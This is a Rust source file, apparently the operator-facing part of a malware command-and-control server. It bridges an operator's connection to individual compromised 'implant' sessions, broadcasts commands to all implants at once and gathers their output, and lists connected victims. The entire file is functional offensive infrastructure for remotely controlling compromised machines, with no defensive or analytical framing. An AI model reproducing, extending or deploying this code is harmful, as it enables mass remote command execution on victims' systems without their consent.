use crate::models::{ImplantSession, SessionManager};
use anyhow::{Context, Result};
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::Mutex as AsyncMutex;
use tokio::time::{Duration, timeout};
use tracing::{info, warn};

const CMD_TIMEOUT: Duration = Duration::from_secs(10);

pub async fn manage_c2_conn(
    mut stream: TcpStream,
    sessions: SessionManager,
    addr: SocketAddr,
) -> Result<()> {
    let headers = read_headers(&mut stream)
        .await
        .context("failed to read C2 headers")?;

    let session_id: Option<u32> =
        parse_header(&headers, "X-Session-Id").and_then(|v| v.parse().ok());

    let broadcast_cmd: Option<String> = parse_header(&headers, "X-Broadcast");

    match session_id {
        // ── bridge C2 to a specific implant ────────────────────────────────
        Some(id) => {
            let session = match sessions.take(id) {
                Some(s) => s,
                None => {
                    warn!("{addr}: C2 requested implant #{id} — not found");
                    stream
                        .write_all(b"HTTP/1.1 404 Not Found\r\n\r\n")
                        .await
                        .ok();
                    return Ok(());
                }
            };

            info!("{addr}: bridging C2 <-> implant #{id}");

            stream
                .write_all(b"HTTP/1.1 200 OK\r\nX-Bridge: ready\r\n\r\n")
                .await
                .context("failed to send bridge-ready")?;

            let c2_closed = bridge(stream, &session).await;

            if c2_closed {
                // C2 disconnected cleanly — implant still alive
                info!("{addr}: C2 left bridge — returning implant #{id} to pool");
                sessions.give_back(session);
            } else {
                // implant dropped — reader_task already called cancel()
                // watcher already removed it from pool (or it was taken so no-op)
                info!("{addr}: implant #{id} disconnected during bridge");
            }
        }

        None => match broadcast_cmd {
            // ── broadcast a command to every implant ────────────────────────
            Some(cmd) => {
                info!("{addr}: C2 broadcast → {cmd:?}");
                let ids = sessions.list_ids();

                if ids.is_empty() {
                    stream
                        .write_all(b"HTTP/1.1 200 OK\r\n\r\nno implants in pool\n")
                        .await
                        .ok();
                    return Ok(());
                }

                let mut results = String::new();

                for id in ids {
                    let session = match sessions.take(id) {
                        Some(s) => s,
                        None => continue, // gone between list and take
                    };

                    let result = send_recv(&session, cmd.as_bytes()).await;
                    results.push_str(&format!("── implant #{id} ──\n{result}\n"));

                    if !session.cancel.is_cancelled() {
                        sessions.give_back(session);
                    }
                    // if cancelled, session just drops here — watcher already cleaned pool
                }

                let body = if results.is_empty() {
                    "no results\n".to_string()
                } else {
                    results
                };

                stream
                    .write_all(
                        format!(
                            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}",
                            body.len(),
                            body
                        )
                        .as_bytes(),
                    )
                    .await
                    .ok();
            }

            // ── no session id, no broadcast — list implants ─────────────────
            None => {
                let ids = sessions.list_ids();
                let body = if ids.is_empty() {
                    "no implants connected\n".to_string()
                } else {
                    ids.iter()
                        .map(|id| format!("implant #{id}\n"))
                        .collect::<String>()
                };

                stream
                    .write_all(
                        format!(
                            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}",
                            body.len(),
                            body
                        )
                        .as_bytes(),
                    )
                    .await
                    .ok();
            }
        },
    }

    Ok(())
}

/// Bidirectional raw copy — C2 ↔ implant.
///
/// Returns `true`  → C2 closed first  → give implant back to pool
/// Returns `false` → implant dropped  → session is dead, discard
async fn bridge(c2: TcpStream, session: &ImplantSession) -> bool {
    let (mut c2_r, c2_w) = c2.into_split();

    // wrap write half so both directions can share it via Arc
    let c2_w = Arc::new(AsyncMutex::new(c2_w));
    let c2_w_imp = c2_w.clone();

    let imp_writer = session.writer.clone();
    let from_implant = session.from_implant.clone();

    tokio::select! {
        // C2 → implant: read from c2, write to implant writer
        c2_closed = async move {
            let mut buf = [0u8; 4096];
            loop {
                match c2_r.read(&mut buf).await {
                    Ok(0) | Err(_) => break true,
                    Ok(n) => {
                        let mut w = imp_writer.lock().await;
                        if w.write_all(&buf[..n]).await.is_err() {
                            break false;
                        }
                    }
                }
            }
        } => c2_closed,

        // implant → C2: drain the channel, write to c2
        _ = async move {
            let mut rx = from_implant.lock().await;
            while let Some(data) = rx.recv().await {
                let mut w = c2_w_imp.lock().await;
                if w.write_all(&data).await.is_err() {
                    break;
                }
            }
            // channel closed = reader_task exited = implant gone
        } => false,
    }
}

/// Write a command to an implant, wait for one response with timeout.
async fn send_recv(session: &ImplantSession, cmd: &[u8]) -> String {
    {
        let mut w = session.writer.lock().await;
        if let Err(e) = w.write_all(cmd).await {
            return format!("send error: {e}");
        }
    }

    let mut rx = session.from_implant.lock().await;
    match timeout(CMD_TIMEOUT, rx.recv()).await {
        Ok(Some(data)) => String::from_utf8_lossy(&data).into_owned(),
        Ok(None) => "implant disconnected".to_string(),
        Err(_) => "timed out".to_string(),
    }
}

/// Read bytes until `\r\n\r\n` — consumes the full HTTP request header.
async fn read_headers(stream: &mut TcpStream) -> Result<String> {
    let mut buf = Vec::with_capacity(1024);
    let mut tmp = [0u8; 1];

    loop {
        stream
            .read_exact(&mut tmp)
            .await
            .context("connection closed mid-headers")?;

        buf.push(tmp[0]);

        if buf.ends_with(b"\r\n\r\n") {
            break;
        }
        if buf.len() > 8192 {
            anyhow::bail!("headers too large");
        }
    }

    String::from_utf8(buf).context("headers are not valid UTF-8")
}

/// Case-insensitive header value lookup.
fn parse_header(headers: &str, key: &str) -> Option<String> {
    let key_lower = key.to_lowercase();
    headers
        .lines()
        .find(|l| l.to_lowercase().starts_with(&key_lower))
        .and_then(|l| l.splitn(2, ':').nth(1))
        .map(|v| v.trim().to_string())
}
